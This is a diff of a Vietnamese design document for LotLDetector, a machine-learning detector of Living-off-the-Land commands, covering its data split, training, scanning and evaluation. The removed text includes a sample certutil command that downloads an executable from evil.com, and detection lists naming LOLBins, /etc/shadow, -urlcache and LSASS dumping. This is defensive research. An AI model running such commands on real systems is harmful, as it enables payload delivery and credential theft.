@@ -1,263 +1,101 @@
-# KIẾN TRÚC VÀ SƠ ĐỒ HOẠT ĐỘNG HỆ THỐNG LOTLDETECTOR
-> **Living off the Land (LotL) Attack Detection System using Hybrid Machine Learning & NLP**  
-> *Học viện Kỹ thuật Mật mã (KMA) — Đề tài Nghiên cứu Ứng dụng Học máy trong Phát hiện Tấn công Living off the Land*
+# Luồng hoạt động LotLDetector
 
----
+Mục tiêu tổ chức là giữ ba thao tác thực nghiệm rõ ràng: **train**, **scan**, **evaluate**. Hướng dẫn chạy nằm trong [README.md](README.md).
 
-## 1. TỔNG QUAN KIẾN TRÚC TOÀN HỆ THỐNG (HIGH-LEVEL ARCHITECTURE)
-
-Hệ thống **LotLDetector** hoạt động theo mô hình **Kiến trúc Lai (Hybrid Architecture)**, kết hợp giữa:
-1. **Quy tắc Chuyên gia & Cẩm nang Tri thức An ninh Toàn cầu** (Expert Rules + Global Domain Knowledge Base: LOLBAS / GTFOBins / MITRE ATT&CK).
-2. **Xử lý Ngôn ngữ Tự nhiên & Đo độ tương đồng cú pháp** (NLP: Sentence BLEU token n-gram matching).
-3. **Mô hình Học máy Cổ điển Phân tán** (Classical Machine Learning: Tree-based Random Forest Classifier với cơ chế Cân bằng Trọng số Lớp).
-
-```mermaid
-graph TD
-    classDef inputStyle fill:#1e293b,stroke:#3b82f6,stroke-width:2px,color:#fff;
-    classDef prepStyle fill:#0f172a,stroke:#64748b,stroke-width:2px,color:#fff;
-    classDef featStyle fill:#0c4a6e,stroke:#0284c7,stroke-width:2px,color:#fff;
-    classDef mlStyle fill:#14532d,stroke:#22c55e,stroke-width:2px,color:#fff;
-    classDef outStyle fill:#450a0a,stroke:#ef4444,stroke-width:2px,color:#fff;
-    classDef goodStyle fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff;
-
-    IN["📥 INPUT: Dòng lệnh thô (Raw Command Line)<br/><i>CMD, PowerShell, hoặc Linux Bash</i>"]:::inputStyle
-
-    subgraph PREP["BƯỚC 1: TIỀN XỬ LÝ & KHỬ LÀM RỐI (PREPROCESSING & DEOBFUSCATION)"]
-        NORM["Khử làm rối dấu mũ: deobfuscate_cmd()<br/><i>c^e^r^t^u^t^i^l → certutil</i>"]
-        IP["Chuẩn hóa & Gán nhãn địa chỉ IP: extract_ip_labels()<br/><i>IP_LOOPBACK, IP_PRIVATE, IP_PUBLIC...</i>"]
-        TOK["Tách từ theo nền tảng: Platform Tokenizer<br/><i>Windows: split_windows() | Linux: split_linux()</i>"]
-    end
-
-    subgraph FEAT["BƯỚC 2: TRÍCH XUẤT ĐẶC TRƯNG LAI (HYBRID FEATURE PIPELINE)"]
-        F_CMD["🏷️ COMMAND: Nhận diện LOLBins/GTFOBins<br/><i>certutil, wmic, rundll32, curl, tar, nc...</i>"]
-        F_PATH["🏷️ PATH: Kiểm tra đường dẫn nhạy cảm<br/><i>System32, SysWOW64, /etc/shadow, /bin/sh...</i>"]
-        F_KW["🏷️ KEYWORD: Nhận diện tham số rủi ro<br/><i>-urlcache, -split, -enc, DownloadFile...</i>"]
-        F_REG["🏷️ REGEX: So khớp 5 cụm hành vi tấn công<br/><i>Download, Proxy Exec, LSASS Dump, Anti-Forensics...</i>"]
-        
-        CORPUS[("📚 External Knowledge Base<br/>cmd_known.corpus / bash_known.corpus<br/><i>(LOLBAS & GTFOBins PoC)</i>")]
-        F_BLEU["🏷️ NLP BLEU: SimilarityMatcher<br/><i>So khớp n-gram cú pháp (Threshold > 0.5)<br/>→ Gán nhãn LOOKS_LIKE_KNOWN_LOL</i>"]
-        CORPUS -.-> F_BLEU
-    end
-
-    subgraph VEC["BƯỚC 3: MÃ HÓA VECTOR (VECTORIZATION)"]
-        CV["Mã hóa Túi đặc trưng: CountVectorizer<br/><i>Vector đặc trưng thưa (Sparse Binary Vector)</i>"]
-    end
-
-    subgraph ML["BƯỚC 4: HỌC MÁY PHÂN LOẠI (RANDOM FOREST ENGINE)"]
-        RF["Random Forest Classifier (100 Decision Trees)<br/><i>class_weight='balanced'</i>"]
-        PROB["Tính toán Phân bố Xác suất Tấn công<br/><i>predict_proba() → P(Malicious)</i>"]
-    end
-
-    subgraph DECIDE["BƯỚC 5: BỘ HIỆU CHUẨN NGƯỠNG QUYẾT ĐỊNH (DECISION ENGINE)"]
-        TH_CHECK{"Hiệu chuẩn Ngưỡng tối ưu:<br/><i>Windows: P ≥ 0.35 ?<br/>Linux: P ≥ 0.60 ?</i>"}
-        FEW_CHECK{"Kiểm tra số lượng nhãn<br/><i>len(labels) < 1 ?</i>"}
-    end
-
-    OUT_BAD["⚠️ KẾT QUẢ: BAD<br/><i>Phát hiện tấn công LotL!<br/>Kèm độ tin cậy và giải thích đặc trưng</i>"]:::outStyle
-    OUT_GOOD["✅ KẾT QUẢ: GOOD<br/><i>Lệnh lành tính / Thao tác quản trị</i>"]:::goodStyle
-    OUT_NEU["❓ KẾT QUẢ: NEUTRAL<br/><i>Lệnh không đủ dấu hiệu nguy hại</i>"]:::inputStyle
-
-    IN --> NORM --> IP --> TOK
-    TOK --> F_CMD & F_PATH & F_KW & F_REG & F_BLEU
-    F_CMD & F_PATH & F_KW & F_REG & F_BLEU --> CV
-    CV --> RF --> PROB --> TH_CHECK
-    
-    TH_CHECK -- "Vượt ngưỡng hoặc trùng mẫu BLEU" --> OUT_BAD
-    TH_CHECK -- "Không vượt ngưỡng" --> FEW_CHECK
-    FEW_CHECK -- "Không có đặc trưng nhận diện" --> OUT_NEU
-    FEW_CHECK -- "Có đặc trưng lành tính" --> OUT_GOOD
-```
-
----
-
-## 2. QUY TRÌNH TIỀN XỬ LÝ VÀ CHUẨN BỊ DỮ LIỆU (DATA PREPARATION PIPELINE)
-
-Quy trình thu thập, làm sạch và chia tách dữ liệu thực hiện độc lập qua script `scripts/01_prepare_dataset.py`.
+## 1. Tổng quan
 
 ```mermaid
 flowchart TD
-    subgraph SOURCES_WIN["NGUỒN DỮ LIỆU WINDOWS (DATA SOURCES)"]
-        S1["Scheduled Tasks (120+ lệnh hệ thống)"]
-        S2["Windows Services (184+ lệnh dịch vụ)"]
-        S3["Log EDR Sysmon Event ID 1 (328+ lệnh)"]
-        S4["Lịch sử PSReadLine & Sysadmin (764+ lệnh)"]
-        S5["Atomic Red Team & LOLBAS Attacks (490 lệnh)"]
-    end
-
-    subgraph SOURCES_LINUX["NGUỒN DỮ LIỆU LINUX"]
-        L1["Adobe Cloud Production Logs (6,829 lệnh)"]
-        L2["GTFOBins & Cloud Escapes (666 lệnh)"]
-    end
-
-    RAW_WIN["📁 master_windows.csv<br/><i>2,121 mẫu (1,631 good | 490 bad)</i>"]
-    RAW_LINUX["📁 train_val.csv<br/><i>7,495 mẫu (6,829 good | 666 bad)</i>"]
-
-    SOURCES_WIN --> RAW_WIN
-    SOURCES_LINUX --> RAW_LINUX
-
-    subgraph PREPARE_SCRIPT["01_prepare_dataset.py"]
-        CLEAN["Làm sạch dữ liệu:<br/>• Chuẩn hóa cột (commands, tag)<br/>• Loại bỏ dòng trống, null, ký tự rác<br/>• Loại bỏ mẫu lệnh trùng lặp (deduplication)"]
-        SPLIT["Phân tầng Stratified Split (80% / 10% / 10%):<br/>• Bảo toàn tuyệt đối tỷ lệ Good/Bad giữa các tập<br/>• Random Seed = 42"]
-    end
-
-    RAW_WIN --> CLEAN
-    RAW_LINUX --> CLEAN
-    CLEAN --> SPLIT
-
-    SPLIT --> WIN_TRAIN["📁 data/processed/windows/train.csv (1,696 mẫu)"]
-    SPLIT --> WIN_VAL["📁 data/processed/windows/val.csv (212 mẫu)"]
-    SPLIT --> WIN_TEST["📁 data/processed/windows/test.csv (213 mẫu)"]
-
-    SPLIT --> LIN_TRAIN["📁 data/processed/linux/train.csv (5,996 mẫu)"]
-    SPLIT --> LIN_VAL["📁 data/processed/linux/val.csv (749 mẫu)"]
-    SPLIT --> LIN_TEST["📁 data/processed/linux/test.csv (750 mẫu)"]
+    A[CSV gốc: commands,label] --> B[data.py: đọc và chia tập trong bộ nhớ]
+    B --> C[Train: 90%]
+    B --> E[Test: 10%]
+    C --> F[train.py: học vectorizer và RF]
+    F --> P[data/features/platform/train.csv: ma trận train và nhãn]
+    F --> H[models: classifier, vectorizer, metadata]
+    H --> J[scan.py: dấu nhắc nhập lệnh]
+    H --> K[evaluate.py]
+    E --> K
 ```
 
----
+## 2. Đọc dữ liệu
 
-## 3. QUY TRÌNH HUẤN LUYỆN MÔ HÌNH (MODEL TRAINING PIPELINE)
+`load_train_test` trong `src/data.py` chỉ chấp nhận CSV đã có đúng hai cột `commands,label`, nhãn 0/1 và lệnh không rỗng. Không đổi tên cột, đổi nhãn, deduplicate hoặc tự sửa dữ liệu. Sau bước vector hóa, `save_training_dataset` trong cùng module ghi dataset đặc trưng cuối cùng; đây không phải bước làm sạch dữ liệu gốc.
 
-Thực hiện thông qua `scripts/02_train.py` nạp module `src/models/trainer.py`.
+`load_train_test(platform)` chia trực tiếp dữ liệu thành hai DataFrame: train 90% và test 10%, bằng một lần gọi `train_test_split(test_size=0.1, stratify=frame["label"], random_state=42)`. Stratify giữ tỷ lệ nhãn gần với dữ liệu gốc; số mẫu được làm tròn theo scikit-learn.
+
+Không có tập validation trung gian. Cùng dữ liệu, thứ tự dòng và seed sẽ tái tạo cùng tập test. Nếu sửa dữ liệu hoặc cách chia, cần train lại trước khi evaluate; test hiện tại khác tập test của bản chia 80/10/10 trước đây.
+
+Chỉ fit vectorizer và model trên train. Test được quét riêng bằng `evaluate.py`.
+
+## 3. Huấn luyện
+
+`scripts/train.py` gọi `src/models/trainer.py`:
+
+1. Đọc CSV và chia trực tiếp train/test 90/10 qua `load_train_test`.
+2. Trích feature phần train với `training=True`, bỏ BLEU.
+3. Mẫu BAD không có feature bị bỏ riêng khỏi phần dùng fit; số mẫu bỏ được in ra và lưu trong metadata. Test không lọc theo số feature.
+4. Fit `CountVectorizer` trên phần train để tạo ma trận đặc trưng.
+5. Ghi đúng ma trận và nhãn chuẩn bị đưa vào RF thành `data/features/{platform}/train.csv`. File có các cột `source_index`, `commands`, `label`, sau đó là các cột `feature:<tên>` theo thứ tự vectorizer. Chỉ số nguồn bắt đầu từ 0; ma trận trong RAM vẫn thưa, CSV được ghi từng hàng.
+6. Fit RF 100 cây, trọng số lớp balanced, seed 42 bằng ma trận và nhãn trên.
+7. Lưu classifier, vectorizer và metadata gồm cấu hình, hash CSV gốc/dataset đặc trưng/corpus, số mẫu và cách chia `stratified_shuffle` với tỷ lệ train/test 90/10.
+8. Chạy `scripts/evaluate.py` riêng để đánh giá toàn bộ test bằng predictor đang dùng cho scan.
+
+Model không tự chọn tham số hoặc tự điều chỉnh threshold. Các script tuning được bỏ khỏi luồng tối giản này. Chỉ lưu một cặp classifier/vectorizer, không tạo thêm bản sao dưới tên cũ `model.classifier2`/`model.vectorizer`.
+
+## 4. Quét một lệnh
+
+`scripts/scan.py` nạp `LotLPredictor(platform)` và nhận lệnh từ dấu nhắc `>>>` hoặc đối số vị trí.
 
 ```mermaid
-sequenceDiagram
-    autonumber
-    participant D as Dữ liệu Huấn luyện (train.csv)
-    participant P as Feature Pipeline (Windows/Linux)
-    participant V as CountVectorizer
-    participant RF as RandomForestClassifier
-    participant M as Đánh giá Kiểm chuẩn (val.csv)
-    participant S as Lưu trữ Artifacts (models/)
-
-    Note over D,P: Bước 1: Trích xuất đặc trưng hàng loạt
-    D->>P: Đọc dòng lệnh và nhãn (good: 0 / bad: 1)
-    Note over P: training=True (Bỏ qua so sánh BLEU để tăng tốc huấn luyện 50x)
-    P->>P: Áp dụng Normalizer + Regex + Keywords + Paths + Commands
-    P-->>V: Danh sách chuỗi đặc trưng: "COMMAND_CERTUTIL certutil_downloader..."
-
-    Note over V,RF: Bước 2: Mã hóa & Huấn luyện
-    V->>V: fit_transform(x_train) → Sinh từ điển từ vựng (Vocabulary)
-    V->>RF: Ma trận thưa đặc trưng (Sparse Matrix X) + Vector nhãn (y)
-    RF->>RF: Huấn luyện 100 Decision Trees với class_weight='balanced'
-    
-    Note over RF,M: Bước 3: Đánh giá Kiểm chuẩn trên Val Set
-    M->>P: Trích xuất đặc trưng tập val.csv (training=False: Bật so sánh BLEU)
-    P->>V: transform(x_val)
-    V->>RF: Dự đoán nhãn & xác suất trên x_val
-    RF-->>M: Tính toán Accuracy, Precision, Recall, F1-Score, Confusion Matrix
-
-    Note over M,S: Bước 4: Đóng gói và Xuất Model
-    M->>S: joblib.dump(classifier, "rf_classifier.joblib")
-    M->>S: joblib.dump(vectorizer, "vectorizer.joblib")
-    M->>S: json.dump(top_features + metrics, "feature_config.json")
+flowchart TD
+    A[Chuỗi lệnh] --> B[Feature pipeline theo nền tảng]
+    B --> C[Nhãn IP, path, binary, keyword, regex]
+    B --> D[BLEU so với corpus]
+    C --> E[Vectorizer.transform]
+    D --> E
+    E --> F[RF.predict_proba]
+    F --> G{Không có feature và không có BLEU?}
+    C --> G
+    D --> G
+    G -- Có --> H[NEUTRAL]
+    G -- Không --> I{BLEU khớp hoặc điểm RF đạt ngưỡng?}
+    I -- Có --> J[BAD]
+    I -- Không --> K[GOOD]
 ```
 
----
+Luật quyết định dùng chung nằm tại `src/models/predictor.py`. CLI chỉ in hai dòng `Extracted features` và `Prediction` giống cách sử dụng libLOL. API giữ các trường `command`, `verdict`, `probability`, `labels` và có `predict_batch` cho danh sách lệnh.
 
-## 4. QUY TRÌNH SUY LUẬN & QUÉT THỜI GIAN THỰC (REAL-TIME SCAN INFERENCE)
+`probability` là điểm RF cho lớp 1, không phải độ tin cậy của toàn bộ kết quả hybrid. Nhãn BLEU không được học trong train nhưng có thể ép BAD khi suy luận.
 
-Thực hiện thông qua `scripts/03_scan_cmd.py` nạp module `src/models/predictor.py`.
+## 5. Đánh giá test
 
-```mermaid
-sequenceDiagram
-    autonumber
-    actor User as SOC Analyst / Hệ thống EDR
-    participant CLI as 03_scan_cmd.py
-    participant Pred as LotLPredictor
-    participant Norm as Normalizer & Tokenizer
-    participant Pipe as FeaturePipeline
-    participant Sim as SimilarityMatcher (BLEU)
-    participant Vec as CountVectorizer
-    participant RF as RandomForest
-    participant Dec as Decision Engine
+`scripts/evaluate.py` lấy test qua `load_train_test`, nạp predictor và quét toàn bộ test. Test được tái tạo từ phép chia trực tiếp 90/10, seed 42, giống lúc train. `src/evaluation.py` in classification report, confusion counts và số NEUTRAL, bao gồm số mẫu BAD bị trả NEUTRAL.
 
-    User->>CLI: Quét lệnh: certutil.exe -urlcache -f http://evil.com/a.exe
-    CLI->>Pred: predict(command, platform="windows", threshold=0.35)
-    
-    Pred->>Norm: deobfuscate_cmd() & extract_ip_labels()
-    Norm-->>Pipe: Lệnh đã khử làm rối + Nhãn IP
+Nhờ dùng chung predictor và decision function, kết quả test phản ánh cùng chính sách mà CLI scan sử dụng. Không có bước tự đổi threshold khi evaluate.
 
-    par Trích xuất Tri thức chuyên gia
-        Pipe->>Pipe: Kiểm tra LOLBins, Paths, Keywords, Regex
-    and So khớp Độ tương đồng Cú pháp
-        Pipe->>Sim: is_similar(command, threshold=0.5)
-        Sim->>Sim: So khớp token 4-gram BLEU với cmd_known.corpus
-        Sim-->>Pipe: BLEU > 0.5 → Bổ sung nhãn LOOKS_LIKE_KNOWN_LOL
-    end
+## 6. Các thành phần được giữ lại
 
-    Pipe-->>Pred: Danh sách đặc trưng hoàn chỉnh
-    Pred->>Vec: transform(["COMMAND_CERTUTIL certutil_downloader..."])
-    Vec-->>RF: Vector thưa đặc trưng
-    RF-->>Dec: Xác suất là tấn công P(Malicious) = 0.9643
+| Thành phần | Vai trò |
+|---|---|
+| `preprocessing/normalizer.py` | Tạo chuỗi phân tích Windows có giới hạn và gán nhãn IPv4 |
+| `preprocessing/tokenizer.py` | Tách token Windows/Linux |
+| `features/rules_constants.py` | Danh sách binary/path/keyword và regex |
+| `features/label_generators.py` | Sinh feature từ các danh sách/rule |
+| `features/similarity.py` | So BLEU với corpus |
+| `features/pipeline.py` | Kết hợp các bộ sinh feature |
 
-    Dec->>Dec: So sánh P với Threshold (0.35) & Nhãn BLEU
-    Dec-->>CLI: Verdict = "BAD" | Probability = 96.43% | Features = [...]
-    CLI-->>User: ⚠️ BAD (Phát hiện tấn công LotL! - 96.43%)
-```
+Thư mục `preprocessing` xử lý chuỗi lệnh để tạo feature khi train và scan. Đây là logic phát hiện cần thiết; nó khác với script làm sạch và đổi định dạng dataset đã bỏ.
 
----
+Ngưỡng BLEU vẫn lớn hơn 0,5, candidate dài 6–100 ký tự và có ít nhất 4 token. Ngưỡng RF vẫn là Windows 0,35 và Linux 0,60; số nhãn tối thiểu vẫn là 1. Chính sách mô hình giữ như backup. Predictor nạp ngưỡng đã lưu cùng model, kiểm tra version đặc trưng và hash corpus trước khi dùng.
 
-## 5. PHÂN BỔ BỘ LUẬT VÀ ĐẶC TRƯNG NHẬN DIỆN (FEATURE TAXONOMY)
+## 7. Những phần điều chỉnh sau khi khôi phục backup
 
-```mermaid
-classDiagram
-    class RawCommandLine {
-        +String raw_string
-    }
+- Raw CSV giữ nguyên. Chia trực tiếp train/test 90/10, seed 42; chỉ lọc BAD không có feature trong train. Không đưa test vào fit.
+- Tám danh sách rule là hợp của Adobe và backup: giữ toàn bộ mục ở cả hai nguồn, bỏ mục trùng hoàn toàn. Những tên nhãn khác nhau nhưng cùng hành vi có thể vẫn tương quan; chưa tự xóa chúng khi chưa có bằng chứng tương đương.
+- Giữ nguyên ranh giới biểu thức regex của từng nguồn. Windows dùng IGNORECASE như backup; Linux không dùng cờ này toàn cục để tránh làm sai các biểu thức có phân biệt hoa/thường.
+- IP dùng lookaround để không nuốt dấu phân cách, xét reserved/unspecified trước private.
+- Corpus BLEU là bản Adobe nguyên gốc; 14 dòng Linux bổ sung riêng của backup được giữ trong bản sao để truy nguyên, không đưa vào nhánh tự ép BAD hiện tại. Không xóa các lệnh tương ứng khỏi raw dataset.
+- Giữ tokenizer; thay việc xóa mọi caret bằng các chuỗi phân tích có xét CMD/PowerShell. Giữ nguyên chuỗi gốc, hỗ trợ caret, nháy rỗng trong tên, backtick ngoài chuỗi literal và Base64/UTF-16LE của EncodedCommand; giới hạn 8 chuỗi, 3 bước. Không thực thi nội dung giải mã và không chuẩn hóa Linux bằng quy tắc CMD.
+- Nhãn từ các chuỗi được hợp và bỏ trùng trước CountVectorizer. BLEU vẫn dùng tokenizer theo nền tảng và chỉ mục 4-gram/cache, công thức và ngưỡng không đổi. Lệnh Volt Typhoon sưu tầm chỉ dùng thử ngoài dataset huấn luyện, không đưa vào raw CSV hoặc corpus.
 
-    class Normalizer {
-        +deobfuscate_cmd()
-        +extract_ip_labels()
-        +split_windows()
-        +split_linux()
-    }
-
-    class FeatureLabels {
-        +IP_LABELS: LOOPBACK, PRIVATE, PUBLIC...
-        +PATH_LABELS: System32, SysWOW64, /etc/shadow...
-        +COMMAND_LABELS: certutil, wmic, rundll32, curl...
-        +KEYWORD_LABELS: -urlcache, -split, -enc...
-        +REGEX_LABELS: 5 Chunks of Behavioral Signatures
-        +NLP_LABEL: LOOKS_LIKE_KNOWN_LOL
-    }
-
-    class MachineLearningModel {
-        +CountVectorizer vectorizer
-        +RandomForestClassifier classifier
-        +Float decision_threshold
-        +predict()
-        +predict_proba()
-    }
-
-    class SecurityVerdict {
-        +String command
-        +String verdict: BAD / GOOD / NEUTRAL
-        +Float probability
-        +List~String~ features_attributed
-    }
-
-    RawCommandLine --> Normalizer
-    Normalizer --> FeatureLabels
-    FeatureLabels --> MachineLearningModel
-    MachineLearningModel --> SecurityVerdict
-```
-
----
-
-## 6. BẢNG HIỆU NĂNG THỰC NGHIỆM ĐẠT ĐƯỢC (BENCHMARK RESULTS)
-
-Đánh giá hoàn toàn trên tập **Unseen Test Set** (Tập kiểm thử độc lập, không tham gia vào quá trình huấn luyện và điều chỉnh siêu tham số):
-
-| Chỉ số đánh giá | Mô hình Windows (`models/windows`) | Mô hình Linux (`models/linux`) |
-| :--- | :---: | :---: |
-| **Quy mô tập Test độc lập** | **213 mẫu lệnh** (164 Good, 49 Bad) | **750 mẫu lệnh** (683 Good, 67 Bad) |
-| **Độ chính xác toàn diện (Accuracy)** | **95.31%** | **95.47%** |
-| **Khả năng bắt tấn công (Recall - Bad)** | **91.84%** *(Bắt trúng 45 / 49 cuộc tấn công)* | **71.64%** *(Bắt trúng 48 / 67 cuộc tấn công)* |
-| **Độ chuẩn xác cảnh báo (Precision - Bad)** | **86.54%** *(Ít cảnh báo giả)* | **73.85%** *(Kiểm soát tốt Alert Fatigue)* |
-| **F1-Score lớp Tấn công (Minority F1)** | **0.8911** | **0.7273** |
-| **Độ chuẩn xác lệnh Lành tính (Good Precision)** | **97.52%** *(157 / 161 lệnh)* | **97.23%** *(666 / 685 lệnh)* |
-| **Weighted F1-Score** | **0.9500** | **0.9500** |
-| **Ngưỡng quyết định tối ưu ($Th$)** | **0.35** | **0.60** |
-| **Cơ chế Tiền xử lý** | Khử làm rối dấu `^`, gán nhãn 7 dải IP | Tokenize POSIX, gán nhãn IP, GTFOBins |
-| **Thuật toán ML cốt lõi** | Random Forest (100 cây, class_weight) | Random Forest (100 cây, class_weight) |
-
+Các giới hạn còn tồn tại gồm exact-token binary matching khi có full path, case handling Linux, tokenization mặc định của CountVectorizer và corpus có mẫu trùng test. Cần kiểm chứng riêng trước khi coi hệ thống là bộ quyết định độc hại/an toàn độc lập.
